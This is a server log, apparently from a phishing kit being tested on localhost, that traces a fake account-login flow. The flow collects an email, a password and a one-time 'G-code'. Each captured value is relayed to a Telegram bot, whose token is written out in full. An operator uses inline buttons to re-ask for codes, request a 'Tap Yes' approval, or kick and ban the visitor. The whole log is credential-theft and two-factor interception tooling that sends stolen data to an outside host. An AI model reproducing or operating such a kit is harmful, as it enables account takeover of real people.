+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36268 Closing
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36278 Accepted
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36278 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36278 Closing
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36280 Accepted
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36280 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36280 Closing
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36284 Accepted
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36284 [200]: GET /accounts/js/pwd.js
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36284 Closing
+[Wed Mar 25 12:25:12 2026] 127.0.0.1:36294 Accepted
+[Wed Mar 25 12:25:12 2026] 127.0.0.1:36294 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:25:12 2026] 127.0.0.1:36294 Closing
+[Wed Mar 25 12:25:19 2026] 127.0.0.1:36300 Accepted
+[Wed Mar 25 12:25:19 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":81,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Proccessing<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzadebo54556@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>🔔<\/blockquote><b>PASSWORD:<\/b> <code>w345654345678<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"👤 Ask Username Again","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ask_user"}],[{"text":"🔑 Ask Password Again","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ask_pwd"}],[{"text":"📲 Ask G-Code","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ask_otp"}],[{"text":"📲 Ask Tap Yes","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ask_tap"}],[{"text":"✅ Finish","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a finish"}],[{"text":"❕KICK USER❕","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a kick_user"},{"text":"❗BAN USER❗","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ban_user"}]]}}
+[Wed Mar 25 12:25:19 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/sendMessage {"chat_id":"6044653279","text":"🔔🔑","parse_mode":"HTML","reply_to_message_id":81}
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:36300 [302]: POST /accounts/password.php
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:36300 Closing
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44670 Accepted
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44670 [200]: GET /accounts/process.php?for=password
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44670 Closing
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44680 Accepted
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44680 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44680 Closing
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44684 Accepted
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44684 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:25:20 2026] 127.0.0.1:44684 Closing
+[Wed Mar 25 12:25:21 2026] 127.0.0.1:44694 Accepted
+[Wed Mar 25 12:25:21 2026] 127.0.0.1:44694 [200]: GET /accounts/js/loader.js
+[Wed Mar 25 12:25:21 2026] 127.0.0.1:44694 Closing
+[Wed Mar 25 12:25:22 2026] 127.0.0.1:44710 Accepted
+[Wed Mar 25 12:25:22 2026] 127.0.0.1:44710 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:25:22 2026] 127.0.0.1:44710 Closing
+[Wed Mar 25 12:25:23 2026] 127.0.0.1:44720 Accepted
+[Wed Mar 25 12:25:23 2026] 127.0.0.1:44720 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:23 2026] 127.0.0.1:44720 Closing
+[Wed Mar 25 12:25:24 2026] 127.0.0.1:44732 Accepted
+[Wed Mar 25 12:25:24 2026] 127.0.0.1:44732 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:24 2026] 127.0.0.1:44732 Closing
+[Wed Mar 25 12:25:25 2026] 127.0.0.1:44736 Accepted
+[Wed Mar 25 12:25:25 2026] 127.0.0.1:44736 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:25 2026] 127.0.0.1:44736 Closing
+[Wed Mar 25 12:25:26 2026] 127.0.0.1:44752 Accepted
+[Wed Mar 25 12:25:26 2026] 127.0.0.1:44752 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:26 2026] 127.0.0.1:44752 Closing
+[Wed Mar 25 12:25:26 2026] 127.0.0.1:44754 Accepted
+[Wed Mar 25 12:25:26 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/answerCallbackQuery {"callback_query_id":"7514844076296573828"}
+[Wed Mar 25 12:25:27 2026] 127.0.0.1:44754 [200]: POST /client-area/webhook.php
+[Wed Mar 25 12:25:27 2026] 127.0.0.1:44754 Closing
+[Wed Mar 25 12:25:27 2026] 127.0.0.1:44758 Accepted
+[Wed Mar 25 12:25:27 2026] 127.0.0.1:44758 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:27 2026] 127.0.0.1:44758 Closing
+[Wed Mar 25 12:25:27 2026] 127.0.0.1:44770 Accepted
+[Wed Mar 25 12:25:27 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":81,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Verify it’s you - G-code<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzadebo54556@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>PASSWORD:<\/b> <code>w345654345678<\/code>\n\n<blockquote><b>📲 G-CODE (0️⃣)<\/b> <\/blockquote><blockquote>🔄️<\/blockquote>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"❕KICK USER❕","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a kick_user"},{"text":"❗BAN USER❗","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ban_user"}]]}}
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44770 [200]: GET /accounts/otp.php
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44770 Closing
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44774 Accepted
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44774 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44774 Closing
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44784 Accepted
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44784 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44784 Closing
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44796 Accepted
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44796 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44796 Closing
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44800 Accepted
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44800 [200]: GET /accounts/js/otp.js
+[Wed Mar 25 12:25:28 2026] 127.0.0.1:44800 Closing
+[Wed Mar 25 12:25:29 2026] 127.0.0.1:44806 Accepted
+[Wed Mar 25 12:25:29 2026] 127.0.0.1:44806 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:25:29 2026] 127.0.0.1:44806 Closing
+[Wed Mar 25 12:25:37 2026] 127.0.0.1:41488 Accepted
+[Wed Mar 25 12:25:37 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":81,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Proccessing<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzadebo54556@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>PASSWORD:<\/b> <code>w345654345678<\/code>\n\n<blockquote><b>📲 G-CODE (1️⃣)<\/b> <\/blockquote><blockquote>🔔<\/blockquote><b>OTP:<\/b> <code>456545<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"📲 Ask G-Code Again","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ask_otp"}],[{"text":"📲 Ask Tap Yes","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ask_tap"}],[{"text":"✅ Finish","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a finish"}],[{"text":"❕KICK USER❕","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a kick_user"},{"text":"❗BAN USER❗","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ban_user"}]]}}
+[Wed Mar 25 12:25:38 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/sendMessage {"chat_id":"6044653279","text":"🔔 <b>G-Code Data Updated<\/b>","parse_mode":"HTML","reply_to_message_id":81}
+[Wed Mar 25 12:25:38 2026] 127.0.0.1:41488 [302]: POST /accounts/otp.php
+[Wed Mar 25 12:25:38 2026] 127.0.0.1:41488 Closing
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41490 Accepted
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41490 [200]: GET /accounts/process.php?for=otp
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41490 Closing
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41500 Accepted
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41500 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41500 Closing
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41512 Accepted
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41512 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:41512 Closing
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:60074 Accepted
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:60074 [200]: GET /accounts/js/loader.js
+[Wed Mar 25 12:25:39 2026] 127.0.0.1:60074 Closing
+[Wed Mar 25 12:25:40 2026] 127.0.0.1:60078 Accepted
+[Wed Mar 25 12:25:40 2026] 127.0.0.1:60078 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:25:40 2026] 127.0.0.1:60078 Closing
+[Wed Mar 25 12:25:41 2026] 127.0.0.1:60094 Accepted
+[Wed Mar 25 12:25:41 2026] 127.0.0.1:60094 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:41 2026] 127.0.0.1:60094 Closing
+[Wed Mar 25 12:25:42 2026] 127.0.0.1:60108 Accepted
+[Wed Mar 25 12:25:42 2026] 127.0.0.1:60108 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:42 2026] 127.0.0.1:60108 Closing
+[Wed Mar 25 12:25:43 2026] 127.0.0.1:60112 Accepted
+[Wed Mar 25 12:25:43 2026] 127.0.0.1:60112 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:43 2026] 127.0.0.1:60112 Closing
+[Wed Mar 25 12:25:45 2026] 127.0.0.1:60128 Accepted
+[Wed Mar 25 12:25:45 2026] 127.0.0.1:60128 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:45 2026] 127.0.0.1:60128 Closing
+[Wed Mar 25 12:25:45 2026] 127.0.0.1:60130 Accepted
+[Wed Mar 25 12:25:45 2026] 127.0.0.1:60130 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:45 2026] 127.0.0.1:60130 Closing
+[Wed Mar 25 12:25:46 2026] 127.0.0.1:60140 Accepted
+[Wed Mar 25 12:25:46 2026] 127.0.0.1:60140 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:46 2026] 127.0.0.1:60140 Closing
+[Wed Mar 25 12:25:47 2026] 127.0.0.1:60152 Accepted
+[Wed Mar 25 12:25:47 2026] 127.0.0.1:60152 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:47 2026] 127.0.0.1:60152 Closing
+[Wed Mar 25 12:25:48 2026] 127.0.0.1:60154 Accepted
+[Wed Mar 25 12:25:48 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/answerCallbackQuery {"callback_query_id":"7514844079213027362"}
+[Wed Mar 25 12:25:49 2026] 127.0.0.1:60154 [200]: POST /client-area/webhook.php
+[Wed Mar 25 12:25:49 2026] 127.0.0.1:60154 Closing
+[Wed Mar 25 12:25:49 2026] 127.0.0.1:60170 Accepted
+[Wed Mar 25 12:25:49 2026] 127.0.0.1:60170 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:49 2026] 127.0.0.1:60170 Closing
+[Wed Mar 25 12:25:49 2026] 127.0.0.1:60184 Accepted
+[Wed Mar 25 12:25:49 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":81,"text":"<blockquote>🔴🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>✅ Valid<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzadebo54556@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>PASSWORD:<\/b> <code>w345654345678<\/code>\n\n<blockquote><b>📲 G-CODE (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>OTP:<\/b> <code>456545<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[]}}
+[Wed Mar 25 12:25:49 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/pinChatMessage {"chat_id":"6044653279","message_id":81,"disable_notification":true}
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:60184 [302]: GET /accounts/complete.php
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:60184 Closing
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33374 Accepted
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33374 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33374 Closing
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33378 Accepted
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33378 [200]: POST /client-area/webhook.php
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33378 Closing
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33394 Accepted
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33394 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:50 2026] 127.0.0.1:33394 Closing
+[Wed Mar 25 12:25:51 2026] 127.0.0.1:33396 Accepted
+[Wed Mar 25 12:25:51 2026] 127.0.0.1:33396 [200]: POST /includes/process_request.php?id=c24d186272dad0e6aeff4ad61b4b3d5a
+[Wed Mar 25 12:25:51 2026] 127.0.0.1:33396 Closing
